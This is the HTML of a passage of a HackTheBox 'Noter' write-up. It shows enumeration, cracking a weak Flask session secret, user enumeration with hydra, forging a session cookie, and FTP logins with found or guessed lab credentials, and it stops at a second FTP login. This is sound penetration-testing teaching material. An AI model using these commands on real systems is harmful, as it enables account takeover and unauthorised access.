@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.715771270513">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 2.4.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Noter</title>
+    <meta name="title" content="Noter">
+    <meta name="description" content="IP: 10.129.171.195" />
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/noter/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/noter/">
+    <meta property="og:title" content="Noter">
+    <meta property="og:description" content="IP: 10.129.171.195">
+    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/noter/images/image02.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/noter/">
+    <meta property="twitter:title" content="Noter">
+    <meta property="twitter:description" content="IP: 10.129.171.195">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/noter/images/image02.png">
+
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=2.4.0.715771270513" rel="stylesheet" />
+
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.715771270513" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.715771270513" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.715771270513" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                        </g>
+                                    </svg>
+                                    <span>GitHub</span>
+                                </a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
+                                        </g>
+                                    </svg>
+                                    <span>HackTheBox</span>
+                                </a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+        
+                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
+                        </div>
+        
+                        <!-- Mobile search button mock -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placehokder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button mock -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+                </div>
+            
+                <div class="pl-6 mb-4 mt-1">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                </g>
+                                            </svg>
+                                            <span>GitHub</span>
+                                        </a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
+                                                </g>
+                                            </svg>
+                                            <span>HackTheBox</span>
+                                        </a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="grow min-w-0 px-6 md:px-16">
+                        <main class="relative pt-6 pb-16">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="noter" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#noter">#</doc-anchor-trigger>
+        <span>Noter</span>
+    </h1>
+</doc-anchor-target>
+<p>IP: 10.129.171.195</p>
+<doc-anchor-target id="enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="open-ports">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#open-ports">#</doc-anchor-trigger>
+        <span>Open ports</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.129.171.195  
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+5000/tcp open  upnp</code></pre>
+</doc-codeblock></div>
+<p>Nmap safe scripts:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 21,22,5000 10.129.171.195 -o nmap.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 16:09 AWST
+Nmap scan report for 10.129.171.195
+Host is up (0.29s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
+|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
+|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Noter
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="port-5000">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#port-5000">#</doc-anchor-trigger>
+        <span>Port 5000</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="enum-backend">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enum-backend">#</doc-anchor-trigger>
+        <span>Enum backend</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ whatweb http://10.129.171.223:5000                                                          
+http://10.129.171.223:5000 [200 OK] Bootstrap[3.3.7], 
+Country[RESERVED][ZZ], 
+HTML5, 
+HTTPServer[Werkzeug/2.0.2 Python/3.8.10], 
+IP[10.129.171.223], 
+Python[3.8.10], 
+Script[text/javascript], 
+Title[Noter], 
+Werkzeug[2.0.2]</code></pre>
+</doc-codeblock></div>
+<p>Accessing the Website on port 5000 we see a note taking application. We need to login or register an account to create notes.
+I created an account with the following details:
+<figure class="content-center">
+    <img src="noter/images/image01.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Login in to the application we can create our first note. I tried creating some XSS notes but nothing works:
+<figure class="content-center">
+    <img src="images/image02.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="jwt-cookies">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#jwt-cookies">#</doc-anchor-trigger>
+        <span>JWT cookies</span>
+    </h3>
+</doc-anchor-target>
+<p>Analysing the cookies set by the server when we login we can note that it is using JWT:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY2F1ZWIifQ.Yne0uw.sxL-5XpgVW-Qn5k6ifZtT2jYhS0</code></pre>
+</doc-codeblock></div>
+<p>Something funny happens when we &quot;Add Note&quot;, &quot;Edit&quot; or &quot;Delete&quot;. The server sends a different cookie and then set the original cookie back. Lets edit the note and use Burp to intercept the traffic:
+<figure class="content-center">
+    <img src="images/image03.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Lets use JWT.io to decode and compare them.
+Request cookie:
+<figure class="content-center">
+    <img src="images/image04.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Response cookie:
+<figure class="content-center">
+    <img src="images/image05.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Based on the <code v-pre>_flashes</code> function and the backend (Python) we can assume that the server is running Flask. We can try to use a tool called <code v-pre>flask-unsign</code> to crack the signature and then we can forge our own JWT if we get the secret.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># INSTALL FLASK-UNSIGN
+pip3 install flask-unsign
+
+# CRACK OUR TOKEN
+flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY2F1ZSJ9.Ynen2A.8kt_JvOGzy0Muo8XOVHlicX0ghE' --no-literal-eval --wordlist /usr/share/wordlists/rockyou.txt
+[*] Session decodes to: {'logged_in': True, 'username': 'caueb'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 17152 attempts
+b'secret123'</code></pre>
+</doc-codeblock></div>
+<p>Good, the secret is <code v-pre>secret123</code>, so now we can impersonate any user. We will need to enumerate some users.</p>
+<doc-anchor-target id="user-enumeration">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user-enumeration">#</doc-anchor-trigger>
+        <span>User enumeration</span>
+    </h3>
+</doc-anchor-target>
+<p>In the <a href="http://10.129.171.223:5000/login">http://10.129.171.223:5000/login</a> page we can enumerate users based on the error message. We can type any random password and If the username exists it will display &quot;Invalid login&quot;, but if the username does not exist it shows &quot;Invalid credentials&quot;.
+Lets use <code v-pre>hydra</code> with the wordlist of <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt">Username - Names</a>from seclists:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'whatever' -s 5000 10.129.171.223 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:Invalid credentials&quot;
+
+Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-08 21:00:30
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
+[DATA] attacking http-post-form://10.129.171.223:5000/login:username=^USER^&amp;password=^PASS^:Invalid credentials
+[STATUS] 714.00 tries/min, 714 tries in 00:01h, 9463 to do in 00:14h, 16 active
+[5000][http-post-form] host: 10.129.171.223   login: blue   password: whatever</code></pre>
+</doc-codeblock></div>
+<p>Note that I&#x27;m hiding any response with 110 words (--hw 110) to filter showing wrong credentials.</p>
+<p>After some time we get the user <code v-pre>blue</code>. Now we can forge a token as this user to have a look at his notes.</p>
+<doc-anchor-target id="forge-jwt">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#forge-jwt">#</doc-anchor-trigger>
+        <span>Forge JWT</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># CREATE COOKIE
+flask-unsign --sign --cookie &quot;{'logged_in': True, 'username': 'blue'}&quot; --secret secret123
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yne8vQ.W8TN0te9TwEqYJtjsyooYJyCS4Q</code></pre>
+</doc-codeblock></div>
+<p>We add the generated token to our cookies and reload the page:
+<figure class="content-center">
+    <img src="images/image06.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Looking at <code v-pre>blue</code> notes, we find some credentials:
+<figure class="content-center">
+    <img src="images/image07.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="ftp---port-21">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ftp---port-21">#</doc-anchor-trigger>
+        <span>FTP - Port 21</span>
+    </h2>
+</doc-anchor-target>
+<p>Lets login with the credentials provided:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">blue:blue@Noter!</code></pre>
+</doc-codeblock></div>
+<p>We can download the file <code v-pre>policy.pdf</code> found in the ftp:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/noter/ftp$ ftp 10.129.171.223        
+Connected to 10.129.171.223.
+220 (vsFTPd 3.0.3)
+Name (10.129.171.223:caue): blue
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||8364|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        1002         4096 May 02 23:05 .
+drwxr-xr-x    3 0        1002         4096 May 02 23:05 ..
+drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
+-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
+226 Directory send OK.
+ftp&gt; get policy.pdf
+local: policy.pdf remote: policy.pdf
+229 Entering Extended Passive Mode (|||54429|)
+150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
+100% |************************************************************************************************************| 12569        2.06 MiB/s    00:00 ETA
+226 Transfer complete.
+12569 bytes received in 00:00 (44.99 KiB/s)</code></pre>
+</doc-codeblock></div>
+<p>This line from the PDF looks promising: &quot;Default user-password generated by the application is in the format of &quot;<a href="mailto:username@site">username@site</a>_name!&quot; (This applies to all your applications)&quot;
+We saw above the <code v-pre>ftp_admin</code> user sent an message to user <code v-pre>blue</code>. Following the logic we have:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">ftp_admin:ftp_admin@Noter!</code></pre>
+</doc-codeblock></div>
+<p>Login in to FTP we see 2 app backup files:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/noter/ftp$ ftp 10.129.171.223
+Connected to 10.129.171.223.
